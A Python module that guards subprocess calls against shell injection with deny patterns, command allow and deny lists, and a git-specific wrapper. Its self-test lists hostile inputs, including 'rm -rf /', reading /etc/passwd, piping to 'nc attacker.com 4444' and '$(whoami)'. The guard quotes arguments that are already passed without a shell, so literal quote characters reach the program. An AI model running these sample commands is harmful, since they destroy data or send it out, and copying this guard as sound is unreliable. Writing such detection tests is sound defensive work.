#!/usr/bin/env python3
"""
Shell Injection Prevention - Critical P0 security fix
Prevents command injection vulnerabilities in system calls
"""

import os
import re
import shlex
import subprocess
from pathlib import Path


class ShellInjectionPrevention:
    """Prevents shell injection attacks in system commands"""

    def __init__(self):
        # Dangerous characters that could enable injection
        self.dangerous_patterns = [
            r'[;&|`$()]',  # Command separators and substitution
            r'[<>]',       # Redirection operators
            r'\*\*',       # Globbing patterns
            r'\.\./',      # Directory traversal
            r'rm\s+-rf',   # Dangerous rm commands
            r'sudo\s+',    # Privilege escalation
            r'chmod\s+',   # Permission changes
            r'chown\s+',   # Ownership changes
        ]

        # Allowed commands whitelist
        self.allowed_commands = {
            'git', 'ls', 'cat', 'grep', 'find', 'head', 'tail',
            'wc', 'sort', 'uniq', 'cut', 'awk', 'sed', 'python3',
            'pip', 'npm', 'node', 'docker', 'kubectl'
        }

        # Commands that require special handling
        self.restricted_commands = {
            'rm', 'mv', 'cp', 'chmod', 'chown', 'sudo', 'su',
            'systemctl', 'service', 'kill', 'killall'
        }

    def sanitize_command_args(self, args: list[str]) -> list[str]:
        """Sanitize command arguments to prevent injection"""
        sanitized = []

        for arg in args:
            # Check for dangerous patterns
            if self._contains_dangerous_patterns(arg):
                raise ValueError(f"Potentially dangerous argument detected: {arg}")

            # Escape shell metacharacters
            sanitized_arg = shlex.quote(str(arg))
            sanitized.append(sanitized_arg)

        return sanitized

    def validate_command(self, command: str, args: list[str] = None) -> bool:
        """Validate if a command is safe to execute"""
        if not command:
            return False

        # Extract base command name
        base_command = Path(command).name.lower()

        # Check if command is in restricted list
        if base_command in self.restricted_commands:
            raise ValueError(f"Restricted command not allowed: {base_command}")

        # Check if command is in allowed list (if whitelist is enforced)
        if hasattr(self, 'enforce_whitelist') and self.enforce_whitelist:
            if base_command not in self.allowed_commands:
                raise ValueError(f"Command not in allowed list: {base_command}")

        # Validate arguments if provided
        if args:
            for arg in args:
                if self._contains_dangerous_patterns(str(arg)):
                    raise ValueError(f"Dangerous pattern in argument: {arg}")

        return True

    def safe_subprocess_run(self, command: str | list[str], **kwargs) -> subprocess.CompletedProcess:
        """Safely execute subprocess with injection prevention"""

        # Convert string command to list if needed
        if isinstance(command, str):
            # Parse command string safely
            try:
                command_list = shlex.split(command)
            except ValueError as e:
                raise ValueError(f"Invalid command syntax: {e}")
        else:
            command_list = command.copy()

        if not command_list:
            raise ValueError("Empty command")

        # Validate the command
        base_command = command_list[0]
        args = command_list[1:] if len(command_list) > 1 else []

        self.validate_command(base_command, args)

        # Sanitize arguments
        sanitized_args = self.sanitize_command_args(args)
        safe_command = [base_command] + sanitized_args

        # Set secure defaults
        secure_kwargs = {
            'shell': False,  # Never use shell=True
            'capture_output': True,
            'text': True,
            'timeout': kwargs.get('timeout', 30),  # Default timeout
            'cwd': kwargs.get('cwd'),
            'env': self._get_secure_env(kwargs.get('env'))
        }

        # Override with user kwargs (but not shell)
        for key, value in kwargs.items():
            if key != 'shell':  # Never allow shell=True
                secure_kwargs[key] = value

        try:
            result = subprocess.run(safe_command, **secure_kwargs)
            return result
        except subprocess.TimeoutExpired:
            raise ValueError("Command execution timed out")
        except Exception as e:
            raise ValueError(f"Command execution failed: {e}")

    def _contains_dangerous_patterns(self, text: str) -> bool:
        """Check if text contains dangerous patterns"""
        for pattern in self.dangerous_patterns:
            if re.search(pattern, text):
                return True
        return False

    def _get_secure_env(self, user_env: dict[str, str] | None = None) -> dict[str, str]:
        """Get secure environment variables"""
        # Start with minimal secure environment
        secure_env = {
            'PATH': '/usr/local/bin:/usr/bin:/bin',
            'HOME': os.path.expanduser('~'),
            'USER': os.getenv('USER', 'unknown'),
            'LANG': 'en_US.UTF-8'
        }

        # Add user environment variables (with validation)
        if user_env:
            for key, value in user_env.items():
                # Validate environment variable names and values
                if self._is_safe_env_var(key, value):
                    secure_env[key] = value

        return secure_env

    def _is_safe_env_var(self, key: str, value: str) -> bool:
        """Check if environment variable is safe"""
        # Validate key
        if not re.match(r'^[A-Z_][A-Z0-9_]*$', key):
            return False

        # Check for dangerous values
        if self._contains_dangerous_patterns(value):
            return False

        # Block dangerous environment variables
        dangerous_env_vars = {'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES'}
        if key in dangerous_env_vars:
            return False

        return True

class GitCommandSanitizer(ShellInjectionPrevention):
    """Specialized sanitizer for Git commands"""

    def __init__(self):
        super().__init__()
        self.allowed_git_commands = {
            'status', 'log', 'diff', 'show', 'branch', 'tag',
            'add', 'commit', 'push', 'pull', 'fetch', 'clone',
            'checkout', 'merge', 'rebase', 'reset', 'stash'
        }

    def safe_git_command(self, git_args: list[str], **kwargs) -> subprocess.CompletedProcess:
        """Execute git command safely"""
        if not git_args:
            raise ValueError("No git command specified")

        # Validate git subcommand
        git_subcommand = git_args[0]
        if git_subcommand not in self.allowed_git_commands:
            raise ValueError(f"Git subcommand not allowed: {git_subcommand}")

        # Build full command
        full_command = ['git'] + git_args

        return self.safe_subprocess_run(full_command, **kwargs)

# Global instances
_shell_prevention = None
_git_sanitizer = None

def get_shell_prevention() -> ShellInjectionPrevention:
    """Get global shell injection prevention instance"""
    global _shell_prevention
    if _shell_prevention is None:
        _shell_prevention = ShellInjectionPrevention()
    return _shell_prevention

def get_git_sanitizer() -> GitCommandSanitizer:
    """Get global git command sanitizer instance"""
    global _git_sanitizer
    if _git_sanitizer is None:
        _git_sanitizer = GitCommandSanitizer()
    return _git_sanitizer

def safe_run_command(command: str | list[str], **kwargs) -> subprocess.CompletedProcess:
    """Convenience function for safe command execution"""
    prevention = get_shell_prevention()
    return prevention.safe_subprocess_run(command, **kwargs)

def safe_git_command(git_args: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Convenience function for safe git commands"""
    sanitizer = get_git_sanitizer()
    return sanitizer.safe_git_command(git_args, **kwargs)

# Test function
def test_shell_injection_prevention():
    """Test the shell injection prevention"""
    prevention = ShellInjectionPrevention()

    # Test dangerous patterns detection
    dangerous_inputs = [
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 4444",
        "$(whoami)",
        "`id`",
        "../../../etc/passwd"
    ]

    print("Testing dangerous pattern detection:")
    for dangerous_input in dangerous_inputs:
        try:
            prevention.sanitize_command_args([dangerous_input])
            print(f"FAILED: Should have detected: {dangerous_input}")
        except ValueError:
            print(f"PASSED: Detected dangerous input: {dangerous_input}")

    # Test safe commands
    safe_commands = [
        ["ls", "-la"],
        ["git", "status"],
        ["python3", "--version"]
    ]

    print("\nTesting safe commands:")
    for command in safe_commands:
        try:
            result = prevention.safe_subprocess_run(command, timeout=5)
            print(f"PASSED: Safe command executed: {command}")
        except Exception as e:
            print(f"FAILED: Safe command rejected: {command} - {e}")

if __name__ == "__main__":
    test_shell_injection_prevention()
